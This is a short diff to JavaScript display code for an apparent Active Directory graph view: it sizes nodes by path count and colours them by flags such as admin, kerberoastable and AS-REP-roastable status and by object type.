+function nodeRadius(d, pathCount, maxCount) {
+  const base = 16;
+  const bonus = Math.round(((pathCount[d.id] || 0) / maxCount) * 10);
+  return base + bonus;
 }
 
-function nodeStroke(d) {
-  if (d.asrepRoastable) return '#fc8181';
-  return 'transparent';
+function nodeColor(d) {
+  if (d.adminCount)     return '#fc8181';
+  if (d.kerberoastable) return '#f6ad55';
+  if (d.asrepRoastable) return '#feb2b2';
+  if (d.type === 'group')    return '#b794f4';
+  if (d.type === 'computer') return '#90cdf4';
+  return '#63b3ed';
 }
 </script>
 
